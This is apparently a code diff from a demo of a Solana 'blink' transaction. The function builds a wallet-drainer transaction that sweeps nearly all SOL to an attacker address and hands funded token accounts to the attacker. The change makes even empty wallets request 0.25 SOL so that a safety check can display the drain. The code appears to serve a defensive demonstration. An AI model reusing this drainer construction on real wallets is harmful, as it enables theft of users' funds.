@@ -47,8 +47,9 @@ export async function demoBlinkTransaction(account: string) {
     mainnet.getParsedTokenAccountsByOwner(owner, { programId: TOKEN }),
   ])
   const instructions: TransactionInstruction[] = []
-  // Sweep nearly all the SOL.
-  const sweep = balance - 2_000_000
+  // Sweep nearly all the SOL. From an empty wallet (a guest with no wallet to simulate) it still
+  // asks for 0.25 SOL, so the check shows what a drainer requests; the lock keeps it harmless.
+  const sweep = Math.max(balance - 2_000_000, 250_000_000)
   if (sweep > 0) instructions.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: attacker(), lamports: sweep }))
   // Hand the token accounts that hold something to the attacker (SetAuthority, AccountOwner).
   for (const a of tokens.value.filter((t) => Number(t.account.data.parsed.info.tokenAmount.uiAmount) > 0).slice(0, 4)) {
